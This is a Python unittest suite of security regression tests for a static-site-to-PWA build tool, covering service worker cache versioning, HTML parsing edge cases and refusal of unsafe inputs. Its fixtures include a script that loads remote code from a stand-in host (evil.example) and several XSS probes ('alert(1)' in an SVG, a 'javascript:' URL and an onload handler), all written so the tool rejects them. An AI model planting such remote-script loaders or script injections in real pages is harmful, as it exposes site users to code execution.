"""Synthetic regressions for independent 2026-11-14 Grok Build P1/P2 review.
All source fixtures contain no private owner data and never access network.
"""
import json
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

ROOT=Path(__file__).resolve().parents[1]
sys.path.insert(0,str(ROOT/'scripts'))
from pwa_core import inspect_input, sha256
from verify_dist import verify


class SecurityRegressionTests(unittest.TestCase):
    def setUp(self):
        self.ctx=tempfile.TemporaryDirectory()
        self.addCleanup(self.ctx.cleanup)
        self.home=Path(self.ctx.name)
        self.src=self.home/'source'
        self.src.mkdir()

    def create(self,html='<html><head><title>Test</title></head><body><h1>Test</h1></body></html>',**assets):
        (self.src/'index.html').write_text(html,encoding='utf-8')
        for name,content in assets.items():
            path=self.src/name
            path.parent.mkdir(parents=True,exist_ok=True)
            if isinstance(content,str):path.write_text(content,encoding='utf-8')
            else:path.write_bytes(content)
        return self.src

    def build(self,source=None,name='dist',expect=0,strict=True):
        root=source or self.src
        out=self.home/name
        cmd=[sys.executable,str(ROOT/'scripts/build_pwa.py'),str(root),'--out',str(out),'--name','Security Fixture','--short-name','Fixture']
        if strict:cmd.append('--strict-offline')
        result=subprocess.run(cmd,text=True,capture_output=True)
        self.assertEqual(result.returncode,expect,(result.stdout,result.stderr))
        return out,result

    def test_js_content_change_forces_new_service_worker_bytes(self):
        self.create('<html><head></head><body><script src="app.js"></script></body></html>',**{'app.js':'window.VERSION="A";'})
        a,_=self.build(name='A')
        before=sha256(a/'sw.js')
        (self.src/'app.js').write_text('window.VERSION="B";',encoding='utf-8')
        b,_=self.build(name='B')
        self.assertNotEqual(before,sha256(b/'sw.js'))
        self.assertEqual(verify(a),[])
        self.assertEqual(verify(b),[])

    def test_css_content_change_forces_new_worker(self):
        self.create('<html><head><link rel="stylesheet" href="s.css"></head><body>OK</body></html>',**{'s.css':'body{color:red}'})
        a,_=self.build(name='A')
        (self.src/'s.css').write_text('body{color:blue}')
        b,_=self.build(name='B')
        self.assertNotEqual(sha256(a/'sw.js'),sha256(b/'sw.js'))

    def test_worker_cleans_only_own_scope_and_does_not_cache_navigation(self):
        self.create()
        out,_=self.build()
        sw=(out/'sw.js').read_text()
        self.assertIn('self.registration.scope',sw)
        self.assertIn('k.startsWith(CACHE_PREFIX)',sw)
        self.assertIn('url.pathname!==SHELL_PATH',sw)
        self.assertNotIn("put('./index.html'",sw)
        self.assertEqual(verify(out),[])

    def test_script_string_fake_close_does_not_break_manifest(self):
        html='''<!DOCTYPE html><html><head><script>const fake="</head>";</script></head><body><p>Hello</p></body></html>'''
        self.create(html)
        out,_=self.build()
        result=(out/'index.html').read_text()
        self.assertIn('const fake="</head>";',result)
        self.assertIn('";</script><link rel="manifest"',result)
        self.assertEqual(verify(out),[])

    def test_html_comment_fake_closer_does_not_consume_insertion(self):
        self.create('<html><head><!-- </head> --></head><body><!-- </body> --><b>OK</b></body></html>')
        out,_=self.build()
        self.assertEqual(verify(out),[])

    def test_script_body_fake_closer_does_not_break_registrar(self):
        self.create('<html><head></head><body><script>const fake="</body>";</script></body></html>')
        out,_=self.build()
        text=(out/'index.html').read_text()
        self.assertIn('const fake="</body>";',text)
        self.assertEqual(verify(out),[])

    def test_missing_head_refuses_and_does_not_leave_partial_dist(self):
        self.create('<html><body>no head</body></html>')
        out,result=self.build(expect=2)
        self.assertFalse(out.exists())
        self.assertIn('one real </head>',result.stderr)

    def test_dist_verifier_requires_real_manifest_node(self):
        self.create()
        out,_=self.build()
        html=(out/'index.html').read_text()
        (out/'index.html').write_text(html.replace('<link rel="manifest" href="./manifest.webmanifest">','<!-- manifest.webmanifest -->'))
        errors=verify(out)
        self.assertTrue(any('real manifest link' in e for e in errors),errors)

    def test_strict_offline_rejects_dynamic_remote_script(self):
        self.create('<html><head></head><body><script src="app.js"></script></body></html>',**{'app.js':'''const s = document.createElement('script'); s.src='https://evil.example/a.js';document.head.appendChild(s);'''})
        report=inspect_input(self.src)
        self.assertFalse(report['static_conversion_eligible'])
        self.assertFalse(report['offline_complete_claim_allowed'])
        self.build(expect=2)

    def test_svg_with_script_and_email_fails_closed(self):
        self.create('<html><head></head><body><img src="pic.svg"></body></html>',**{'pic.svg':'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script><text>patient.zero@example.com</text></svg>'})
        report=inspect_input(self.src)
        self.assertFalse(report['static_conversion_eligible'])
        self.assertTrue(any('SVG assets require' in s for s in report['issues']))
        self.build(expect=2)

    def test_js_local_storage_census(self):
        self.create('<html><head></head><body><script src="app.js"></script></body></html>',**{'app.js':"localStorage.setItem('synthetic','42')"})
        self.assertTrue(inspect_input(self.src)['has_browser_storage'])
        self.build()

    def test_midline_dynamic_import_refused(self):
        self.create('<html><head></head><body><script src="app.js"></script></body></html>',**{'app.js':"const m = import('./second.js');"})
        self.assertFalse(inspect_input(self.src)['static_conversion_eligible'])
        self.build(expect=2)

    def test_existing_registration_in_js_refused(self):
        self.create('<html><head></head><body><script src="app.js"></script></body></html>',**{'app.js':"navigator.serviceWorker.register('./old.js')"})
        self.assertFalse(inspect_input(self.src)['static_conversion_eligible'])
        self.build(expect=2)

    def test_csp_inline_registrar_conflict_refused(self):
        self.create("<html><head><meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'self'\"></head><body></body></html>")
        self.assertFalse(inspect_input(self.src)['static_conversion_eligible'])
        self.build(expect=2)

    def test_url_or_js_inline_scheme_refused(self):
        self.create('<html><head></head><body><script src="javascript:alert(1)"></script></body></html>')
        self.assertFalse(inspect_input(self.src)['static_conversion_eligible'])

    def test_inline_event_handlers_rejected(self):
        self.create('<html><head></head><body onload="alert(1)"></body></html>')
        self.assertFalse(inspect_input(self.src)['static_conversion_eligible'])

    def test_verifier_detects_stale_worker_content_hash(self):
        self.create('<html><head></head><body><script src="app.js"></script></body></html>',**{'app.js':'window.VERSION="A";'})
        out,_=self.build()
        (out/'app.js').write_text('window.VERSION="B";')
        self.assertTrue(any('cache version' in e for e in verify(out)))

    def test_missing_asset_never_writes_partial_build(self):
        self.create('<html><head></head><body><script src="not-found.js"></script></body></html>')
        out,_=self.build(expect=2)
        self.assertFalse(out.exists())

if __name__=='__main__':unittest.main()
